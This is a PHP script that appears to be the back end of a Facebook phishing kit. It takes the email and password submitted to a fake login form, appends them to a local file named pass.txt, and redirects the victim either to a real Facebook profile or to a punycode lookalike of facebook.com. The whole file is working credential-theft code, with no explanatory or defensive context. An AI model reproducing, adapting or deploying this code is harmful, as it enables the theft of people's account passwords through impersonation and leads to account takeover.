<?php
require "pass.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
if(empty($email) || empty($pass)){
    header('Location: https://www.xn--facebok-f1a.co/yashikasingh345/');
}
else{
    $email = $email;
    $pass = $pass;
    $sep = "*********************\n";
    file_put_contents('pass.txt', $email.PHP_EOL , FILE_APPEND | LOCK_EX);
    file_put_contents('pass.txt', $pass.PHP_EOL , FILE_APPEND | LOCK_EX);
    file_put_contents('pass.txt', $sep.PHP_EOL , FILE_APPEND | LOCK_EX);
    header('Location: https://m.facebook.com/profile.php?id=100028070380145');
}
?>